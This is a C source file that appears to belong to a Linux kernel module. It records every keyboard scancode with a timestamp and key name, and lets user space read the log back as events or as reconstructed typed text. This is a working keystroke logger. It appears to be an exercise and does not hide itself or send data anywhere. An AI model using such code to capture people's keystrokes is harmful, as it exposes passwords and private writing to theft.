#include "keyboard.h"
#include "list.h"

extern t_keylst	*k_lst;
int	delete = 0;

int		printable_char(unsigned char key)
{
	if (key == 28 || key == 14 || key == 58 || key == 122 || key == 42 || key == 29 || key == 56 || \
		key == 15 || key == 92 || key == 96 || key == 75 || key == 72 || key == 80 || key == 77 || \
		key == 54 || key == 1)
		return 1;
	return 0;
}

void		display_list_element(t_keylst *node, char *buffer, loff_t **offset, size_t len, int key_or_log)
{
	char	message[128] = {0};
	int	msg_len;
	
	if (key_or_log == 1)
		sprintf(message, "%s%ld:%ld:%ld %s (%d) %s%s\n",node->state ? RED : GREEN, \
			(node->time.tv_sec / 3600) % 24, \
			(node->time.tv_sec / 60) % 60, node->time.tv_sec % 60, \
		       	node->name, node->key, node->state ? "Released" : "Pressed", RESET);
	else
	{
		if (!node->state)
		{
			if (!printable_char(node->key))
				sprintf(message, "%s",node->name);
			else if (node->key == 28)
				sprintf(message, "\n");
			else if (node->key == 15)
				sprintf(message, "\t");
			else if (node->key == 14)
				delete++;
		}
	}
	msg_len = strlen(message);
	if (len > msg_len)
	{
		if (*(buffer + **offset - delete) == '\n' || buffer + **offset - delete < buffer)
			delete--;
		else if (delete)
			*(buffer + **offset - delete) = '\0';
		if (!copy_to_user(buffer + **offset - delete, message, msg_len))
			**offset += msg_len;
		else
			printk(KERN_INFO "copy to user failed \n");
	}
}

int		browse_linked_list(t_keylst *lst, char *buffer, loff_t **offset, size_t len, int key_or_log)
{
	t_keylst	*tmp;

	if (!k_lst)
		return 1;
	delete = 0;
	tmp = k_lst;
	while (tmp)
	{
		display_list_element(tmp, buffer, offset, len, key_or_log);
		tmp = tmp->next;
	}
	return 2;
}

t_keylst		*find_last_list_element(t_keylst *full_lst)
{
	t_keylst	*tmp_lst;

	tmp_lst = full_lst;
	while (tmp_lst->next != NULL)
		tmp_lst = tmp_lst->next;
	return tmp_lst;
}

t_keylst		*init_node(t_keylst *node, unsigned char scancode)
{
	node->key = scancode & KBD_SCANCODE_MASK;
	node->state = scancode & KBD_STATUS_MASK;
	strcpy(node->name, keyboard_name[scancode & KBD_SCANCODE_MASK]);
	getnstimeofday(&(node->time));
	node->next = NULL;
	return node;
}

int			add_to_list(unsigned char scancode)
{
	t_keylst	*tmp_lst = NULL;
	t_keylst	*new_node = NULL;

	if (!(new_node = (t_keylst *)kmalloc(sizeof(t_keylst), GFP_KERNEL)))
		return 1;
	new_node = init_node(new_node, scancode);
	if (k_lst == NULL)
		k_lst = new_node;
	else
	{
		tmp_lst = k_lst;
		tmp_lst = find_last_list_element(tmp_lst);
		tmp_lst->next = new_node;
	}
	return 0;
}
